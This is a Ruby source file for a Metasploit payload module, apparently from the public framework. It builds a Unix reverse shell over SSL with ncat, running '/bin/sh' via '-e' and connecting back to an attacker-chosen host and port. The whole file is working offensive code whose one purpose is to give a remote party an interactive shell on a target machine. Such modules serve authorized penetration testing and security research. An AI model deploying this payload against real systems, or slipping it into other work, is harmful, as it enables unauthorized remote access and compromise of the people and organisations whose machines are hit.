##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 42

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
     'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
     'Author'      => 'C_Sto',
     'License'     => MSF_LICENSE,
     'Platform'    => 'unix',
     'Arch'        => ARCH_CMD,
     'Handler'     => Msf::Handler::ReverseTcpSsl,
     'Session'     => Msf::Sessions::CommandShell,
     'PayloadType' => 'cmd',
     'RequiredCmd' => 'ncat',
     'Payload'     =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('NcatPath', [true, 'The path to the NCat executable', 'ncat']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['NcatPath']} -e #{datastore['ShellPath']} --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
  end
end
